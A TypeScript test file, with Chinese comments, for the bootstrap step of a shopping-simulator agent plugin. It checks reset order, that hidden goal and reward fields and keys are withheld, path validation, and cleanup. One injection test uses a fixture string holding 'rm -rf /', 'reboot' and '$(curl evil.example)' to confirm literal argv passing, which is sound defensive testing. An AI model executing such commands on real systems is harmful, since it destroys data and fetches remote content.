/**
 * bootstrap 架构测试（instruction-before-first-decision）。
 * 全部离线：mock client/fake process，不调真实模型，不消耗 API key。
 *
 * 覆盖任务要求的 10 项：
 *   1. reset 发生在构造 DSH 初始任务 prompt 之前
 *   2. 初始 prompt 包含准确的 instruction_text
 *   3. 第一次模型决策不依赖任何工具调用来取得任务
 *   4. 整个 run 只发生一次 reset
 *   5. plugin 接管 bootstrap env_idx 后不会再次 reset
 *   6. 第一个工具结果不再注入 task instruction
 *   7. bootstrap 内容不含 gold/reward/purchase/完整 observation/API key
 *   8. 任务文本含换行/引号/反引号/$() 时无 shell 注入（argv 字面值传递）
 *   9. 正常、异常和中断路径只 release 当前 env_idx
 *  10. actor trace 中 task_instruction 出现在第一个 tool_call 之前
 */

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, readdirSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";

import { ShopSimulatorHttpClient } from "../../plugins/shopping/src/environment/client.ts";
import { ShoppingRuntime } from "../../plugins/shopping/src/tools/runtime.ts";
import {
  registerShoppingTools,
  type DshToolDefinition,
  type DshToolRegistryLike,
} from "../../plugins/shopping/src/tools/register.ts";
import {
  BootstrapError,
  assertValidOutputPath,
  assertValidRunId,
  buildBootstrap,
  buildInitialTaskPrompt,
  buildReleasePayload,
  loadBootstrap,
  resolveBootstrapPath,
  writeBootstrap,
  type BootstrapSession,
} from "../../plugins/shopping/src/rollout/bootstrap.ts";
import { existsSync, unlinkSync } from "node:fs";

const SECRET = "SECRET-GOAL-gold-asin-xyz";
const API_KEY = "sk-SENTINEL-api-key";
const TASK_TEXT = "请购买一个适合儿童的乳胶枕头，预算 200 元以内";

class Collector implements DshToolRegistryLike {
  definitions: DshToolDefinition[] = [];
  register(definition: DshToolDefinition): () => void {
    this.definitions.push(definition);
    return () => undefined;
  }
  byName(name: string): DshToolDefinition {
    const found = this.definitions.find((entry) => entry.name === name);
    assert.ok(found);
    return found;
  }
}

/** mock 环境：reset 返回含隐藏字段的全量响应（模拟真实服务端）。 */
function lifecycleFetch() {
  const captured: Array<Record<string, unknown>> = [];
  const fetchImpl = (async (_input: RequestInfo | URL, init?: RequestInit) => {
    const payload = JSON.parse(String(init?.body)) as Record<string, unknown>;
    captured.push(payload);
    switch (payload["action"]) {
      case "reset":
        return new Response(JSON.stringify({
          result: {
            env_idx: 7,
            instruction: TASK_TEXT,
            instruction_simple: SECRET,
            goal_options: { 颜色: [SECRET] },
            environment_version: "shopsimulator-environment-v2.1",
            message: "Task 0 started",
            observation_state: { page_type: "search_home", search_available: true, actions: [] },
          },
        }), { status: 200 });
      case "interact":
        return new Response(JSON.stringify({
          result: {
            done: false,
            reward: 0,
            reward_detail: { gold_asin: SECRET },
            instruction: SECRET,
            goal: { asin: SECRET },
            purchase: {},
            env_idx: 7,
            over: false,
            observation_state: {
              page_type: "search_results",
              search_available: true,
              actions: ["B0PILLOW01"],
              products: [{ asin: "B0PILLOW01", title: "儿童乳胶枕" }],
            },
          },
        }), { status: 200 });
      case "release_one":
        return new Response(JSON.stringify({
          result: { message: `Environment ${String(payload["env_idx"])} has been released` },
        }), { status: 200 });
      default:
        throw new Error(`unexpected action: ${String(payload["action"])}`);
    }
  }) as typeof fetch;
  return { fetchImpl, captured };
}

const exec = { signal: new AbortController().signal };

// 1 + 7. reset 先于 prompt；bootstrap 白名单 -------------------------------------

test("1/7. reset 先于 prompt 构造；bootstrap 只含 actor-safe 字段", () => {
  const timeline: string[] = [];
  const { fetchImpl } = lifecycleFetch();
  const client = new ShopSimulatorHttpClient("http://127.0.0.1:5700", { fetchImpl });

  // 模拟 runner bootstrap：reset → buildBootstrap → prompt
  return client.reset(0).then((resetResult) => {
    timeline.push("reset");
    const bootstrap = buildBootstrap({ runId: "run-b1", taskId: 0, resetResult });
    timeline.push("bootstrap");
    const prompt = buildInitialTaskPrompt(bootstrap);
    timeline.push("prompt");

    assert.deepEqual(timeline, ["reset", "bootstrap", "prompt"]);

    // bootstrap 内容白名单：不含任何隐藏/凭据内容
    const serialized = JSON.stringify(bootstrap);
    assert.ok(!serialized.includes(SECRET));
    assert.ok(!serialized.includes(API_KEY));
    assert.deepEqual(Object.keys(bootstrap).sort(), [
      "env_idx", "instruction_text", "run_id", "schema_version", "task_id",
    ]);
    assert.equal(bootstrap.env_idx, 7);
    assert.equal(bootstrap.instruction_text, TASK_TEXT);
    assert.ok(!prompt.includes(SECRET));
  });
});

test("7b. buildBootstrap 拒绝无任务指令的 reset", () => {
  assert.throws(
    () => buildBootstrap({
      runId: "r", taskId: 0,
      resetResult: { envIdx: 1, environmentVersion: null, message: null, task: null, observation: null },
    }),
    BootstrapError,
  );
});

test("11. writeBootstrap 创建即 0600、原子落盘、拒绝覆盖", () => {
  const dir = mkdtempSync(join(tmpdir(), "bootstrap-"));
  try {
    const path = join(dir, "runs", "run-x", "bootstrap.json");
    const bootstrap: BootstrapSession = {
      schema_version: 1, run_id: "run-x", task_id: 0, env_idx: 7,
      instruction_text: TASK_TEXT,
    };
    writeBootstrap(path, bootstrap);
    // 权限从创建时就是 0600（无先默认权限再 chmod 的窗口）
    assert.equal(statSync(path).mode & 0o777, 0o600);
    assert.deepEqual(loadBootstrap(path), bootstrap);
    // 不残留临时文件（扫描目录内任何 .tmp- 文件）
    const dirEntries = readdirSync(dirname(path));
    assert.deepEqual(dirEntries.filter((entry) => entry.includes(".tmp-")), []);

    // 目标已存在：拒绝覆盖，原内容不变
    const original = readFileSync(path, "utf-8");
    assert.throws(() => writeBootstrap(path, { ...bootstrap, env_idx: 99 }), BootstrapError);
    assert.equal(readFileSync(path, "utf-8"), original);

    // 非法内容拒绝（独立路径）
    const bads: Array<[string, BootstrapSession]> = [
      ["schema", { ...bootstrap, schema_version: 2 }],
      ["env_idx", { ...bootstrap, env_idx: "7" as unknown as number }],
      ["instruction", { ...bootstrap, instruction_text: "" }],
    ];
    for (const [label, bad] of bads) {
      const badPath = join(dir, `bad-${label}.json`);
      writeBootstrap(badPath, bad);
      assert.throws(() => loadBootstrap(badPath), BootstrapError);
      unlinkSync(badPath);
    }
    assert.throws(() => loadBootstrap(join(dir, "missing.json")), BootstrapError);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("9(路径). run_id 路径穿越与非法字符被拒绝", () => {
  for (const bad of ["../x", "..", "a/b", "a\\b", "/abs", "x/../y", "", "中文 id"]) {
    assert.throws(() => assertValidRunId(bad), BootstrapError, `run_id=${bad}`);
    assert.throws(() => resolveBootstrapPath("/tmp/live", bad), BootstrapError);
  }
  // 合法 run_id → 按 run 隔离路径
  assert.equal(
    resolveBootstrapPath("/tmp/live", "run-2026-08-20T06-10-59-514Z"),
    "/tmp/live/runs/run-2026-08-20T06-10-59-514Z/bootstrap.json",
  );
});

test("9b(路径). 显式 --output 路径校验", () => {
  assert.throws(() => assertValidOutputPath("relative/path.json"), BootstrapError);
  assert.throws(() => assertValidOutputPath("/tmp/../etc/x.json"), BootstrapError);
  assert.throws(() => assertValidOutputPath("/tmp/bootstrap.txt"), BootstrapError);
  assertValidOutputPath("/tmp/live/runs/run-x/bootstrap.json"); // 合法
});

// 2 + 3. 初始 prompt 包含准确任务文本；第一次决策不需要工具调用 ----------------

test("2/3. 初始 prompt 含准确任务文本，模型第一次决策前即拥有任务", () => {
  const bootstrap: BootstrapSession = {
    schema_version: 1, run_id: "run-b2", task_id: 0, env_idx: 7,
    instruction_text: TASK_TEXT,
  };
  const prompt = buildInitialTaskPrompt(bootstrap);
  assert.ok(prompt.includes("<shopping_task>"));
  assert.ok(prompt.includes(TASK_TEXT));
  assert.ok(prompt.includes("</shopping_task>"));
  assert.ok(prompt.includes("不得猜测隐藏的 goal、gold、reward"));
  // prompt 在 boot 前构造完成：不依赖任何工具调用
  assert.ok(prompt.indexOf(TASK_TEXT) > 0);
});

// 8. shell 注入安全：argv 字面值传递 -------------------------------------------

test("8. 危险字符任务文本经 argv 传递保持字面值（无 shell 注入）", () => {
  const hostile = '买枕头\n"; rm -rf / #\n`reboot`\n$(curl evil.example)\n\'quote\'';
  const bootstrap: BootstrapSession = {
    schema_version: 1, run_id: "run-b8", task_id: 0, env_idx: 7,
    instruction_text: hostile,
  };
  const prompt = buildInitialTaskPrompt(bootstrap);

  // 用真实子进程验证 argv 数组传递：spawn 不经 shell，参数按字面值送达
  const result = spawnSync(process.execPath, [
    "-e",
    "process.stdout.write(JSON.stringify(process.argv.slice(1)))",
    prompt,
  ], { encoding: "utf-8" });
  assert.equal(result.status, 0);
  const roundTrip = JSON.parse(result.stdout) as string[];
  assert.equal(roundTrip.length, 1);
  assert.equal(roundTrip[0], prompt);
  assert.ok(roundTrip[0].includes(hostile));
});

// 4 + 5 + 6 + 10. 接管时序集成 --------------------------------------------------

test("4/5/6/10. 全程一次 reset、接管 env_idx、工具结果无指令、trace 顺序真实", async () => {
  const dir = mkdtempSync(join(tmpdir(), "bootstrap-"));
  try {
    const { fetchImpl, captured } = lifecycleFetch();
    const client = new ShopSimulatorHttpClient("http://127.0.0.1:5700", { fetchImpl });

    // runner bootstrap：唯一一次 reset（发生在 DSH 启动前）
    const resetResult = await client.reset(0);
    const bootstrap = buildBootstrap({ runId: "run-b4", taskId: 0, resetResult });

    // plugin boot（第一次模型请求前）：接管 + 记录 trace
    const runtime = new ShoppingRuntime({
      client,
      env: {},
      maxSteps: 5,
      trajectoriesDir: dir,
    });
    const session = runtime.adoptBootstrap(bootstrap);
    assert.equal(session.envIdx, 7); // 接管的是 bootstrap 的 env_idx
    assert.equal(runtime.session, session);

    const registry = new Collector();
    registerShoppingTools(registry, runtime);

    // 模型第一次决策后的工具执行：不再 reset
    const first = await registry.byName("search_products").execute({ query: "乳胶枕头" }, exec) as { summary: string };
    await registry.byName("search_products").execute({ query: "儿童枕头" }, exec);

    // 4. 整个 run 只有一次 reset（bootstrap 的那次）
    const resets = captured.filter((entry) => entry["action"] === "reset");
    assert.equal(resets.length, 1);
    const interacts = captured.filter((entry) => entry["action"] === "interact");
    assert.equal(interacts.length, 2);

    // 5. 接管后插件绝不二次 reset：BOOTSTRAP 模式下 ensureSession 也拒绝自行 reset
    await runtime.closeSession();
    const runtime2 = new ShoppingRuntime({
      client,
      env: { SHOPPING_BOOTSTRAP: "/nonexistent/bootstrap.json" },
    });
    await assert.rejects(() => runtime2.ensureSession(), /不得自行 reset/);

    // 6. 第一个工具结果不含任务指令
    assert.ok(!first.summary.includes(TASK_TEXT));
    assert.ok(!first.summary.includes("【任务指令】"));
    assert.ok(first.summary.includes("B0PILLOW01"));

    // 10. actor trace：run_start → task_instruction → tool_call（顺序真实）
    runtime.recorder?.close();
    const tracePath = join(dir, "actor", "run-b4.jsonl");
    const events = readFileSync(tracePath, "utf-8").trim().split("\n")
      .map((line) => JSON.parse(line) as Record<string, unknown>);
    const names = events.map((event) => event["event"]);
    const idxInstruction = names.indexOf("task_instruction");
    const idxFirstToolCall = names.indexOf("tool_call");
    assert.equal(names[0], "run_start");
    assert.ok(idxInstruction >= 1);
    assert.ok(idxFirstToolCall > idxInstruction);
    // trace 中的指令与 bootstrap 一致（模型确实看到了它）
    const instructionEvent = events[idxInstruction] as { instruction_text: string };
    assert.equal(instructionEvent.instruction_text, TASK_TEXT);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("5b. 已接管会话再次 bootstrap 被拒绝", () => {
  const dir = mkdtempSync(join(tmpdir(), "bootstrap-"));
  const { fetchImpl } = lifecycleFetch();
  const runtime = new ShoppingRuntime({
    client: new ShopSimulatorHttpClient("http://127.0.0.1:5700", { fetchImpl }),
    env: {},
    trajectoriesDir: dir,
    evaluationDir: dir,
  });
  const bootstrap: BootstrapSession = {
    schema_version: 1, run_id: "run-b5", task_id: 0, env_idx: 7,
    instruction_text: TASK_TEXT,
  };
  runtime.adoptBootstrap(bootstrap);
  assert.throws(() => runtime.adoptBootstrap(bootstrap), /不能重复 bootstrap/);
});

// 9. release 只针对当前 env_idx -------------------------------------------------

test("9. 清理载荷只 release_one 当前 env_idx，绝不 release_all", () => {
  const bootstrap: BootstrapSession = {
    schema_version: 1, run_id: "run-b9", task_id: 0, env_idx: 7,
    instruction_text: TASK_TEXT,
  };
  const payload = buildReleasePayload(bootstrap);
  assert.deepEqual(payload, { action: "release_one", env_idx: 7 });
  assert.notEqual(payload.action, "release_all");
});

test("9b. runtime.closeSession 幂等释放、只发一次 HTTP、只针对当前 env_idx（真实 runner/信号路径见 bootstrap_lifecycle.test.ts）", async () => {
  const dir = mkdtempSync(join(tmpdir(), "bootstrap-"));
  const { fetchImpl, captured } = lifecycleFetch();
  const client = new ShopSimulatorHttpClient("http://127.0.0.1:5700", { fetchImpl });
  const runtime = new ShoppingRuntime({
    client, env: {}, maxSteps: 5, trajectoriesDir: dir, evaluationDir: dir,
  });
  runtime.adoptBootstrap({
    schema_version: 1, run_id: "run-b9b", task_id: 0, env_idx: 7,
    instruction_text: TASK_TEXT,
  });

  // 正常结束路径：closeSession → release_one env_idx=7
  await runtime.closeSession();
  const releases = captured.filter((entry) => entry["action"] === "release_one");
  assert.equal(releases.length, 1);
  assert.equal(releases[0]?.["env_idx"], 7);
  assert.ok(!captured.some((entry) => entry["action"] === "release_all"));

  // 重复 release 幂等且仍只针对同一 env_idx
  await runtime.closeSession();
  assert.equal(
    captured.filter((entry) => entry["action"] === "release_one").length,
    1,
  );
});
